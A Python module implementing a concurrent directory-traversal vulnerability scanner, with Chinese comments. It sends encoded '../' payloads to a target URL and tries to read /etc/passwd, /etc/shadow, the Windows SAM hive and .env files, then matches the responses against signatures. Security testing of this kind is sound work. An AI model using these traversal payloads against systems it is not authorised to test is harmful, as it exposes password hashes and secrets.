import requests
from colorama import Fore, init
import logging
import re
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

class DirectoryTraversalScanner:
    """目录遍历漏洞扫描器（并发优化 + 进度仪表盘支持）"""

    PATHS = {
        "linux": ["/etc/passwd", "/etc/shadow", "/etc/hosts"],
        "windows": ["Windows/system32/config/SAM", "Windows/win.ini"],
        "web": ["WEB-INF/web.xml", "config.php", ".env"]
    }

    SENSITIVE_PATTERNS = {
        "linux": [r"root:x:0:0:"],
        "windows": [r"\[boot loader\]"],
        "web": [r"<web-app", r"DB_CONNECTION"]
    }

    def __init__(self, timeout=10, max_depth=3, os_types=None, max_workers=10, dashboard=None):
        self.timeout = timeout
        self.max_depth = max_depth
        self.os_types = os_types if os_types else ["linux", "windows", "web"]
        self.max_workers = max_workers
        self.dashboard = dashboard

        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.setLevel(logging.INFO)
        if not self.logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)

        init(autoreset=True)
        self.user_agent = "Mozilla/5.0"

    def _generate_paths(self):
        test_paths = []
        for os_type in self.os_types:
            for path in self.PATHS[os_type]:
                for depth in range(1, self.max_depth + 1):
                    prefix = '../' * depth
                    encoded = '%2e%2e/' * depth
                    test_paths.append((f"{prefix}{path}", os_type))
                    test_paths.append((f"{encoded}{path}", os_type))
        return test_paths

    def _is_sensitive(self, content, os_type):
        for pattern in self.SENSITIVE_PATTERNS.get(os_type, []):
            if re.search(pattern, content):
                return True, pattern
        return False, None

    def _scan_single(self, url, path_info):
        path, os_type = path_info
        full_url = urljoin(url if url.endswith('/') else url + '/', path.lstrip('/'))
        try:
            resp = requests.get(full_url, headers={'User-Agent': self.user_agent}, timeout=self.timeout)
            if resp.status_code == 200:
                is_sensitive, pattern = self._is_sensitive(resp.text, os_type)
                if is_sensitive:
                    return {
                        'type': 'directory_traversal',
                        'severity': 'critical',
                        'url': full_url,
                        'os_type': os_type,
                        'evidence': pattern,
                        'status_code': resp.status_code
                    }
        except requests.RequestException:
            pass
        return None

    def scan(self, url):
        self.logger.info(f"开始扫描 {url} 的目录遍历漏洞")
        paths = self._generate_paths()
        results = []

        task_id = None
        if self.dashboard:
            task_id = self.dashboard.add_task("目录遍历检测", total=len(paths))

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_path = {executor.submit(self._scan_single, url, p): p for p in paths}
            for future in as_completed(future_to_path):
                result = future.result()
                if result:
                    print(Fore.RED + f"[!] 发现漏洞: {result['url']}")
                    results.append(result)
                if self.dashboard and task_id is not None:
                    self.dashboard.update(task_id, advance=1)

        if self.dashboard:
            self.dashboard.update(task_id, advance=0, completed=True)

        self.logger.info(f"扫描完成，共发现 {len(results)} 个漏洞")
        return results

# 示例用法
if __name__ == "__main__":
    # 配置日志
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    # 创建扫描器实例
    scanner = DirectoryTraversalScanner(
        timeout=10,
        max_depth=4,
        os_types=["linux", "windows", "web"]
    )

    # 扫描目标URL
    target_url = "http://example.com/index.php?page=about"
    results = scanner.scan(target_url)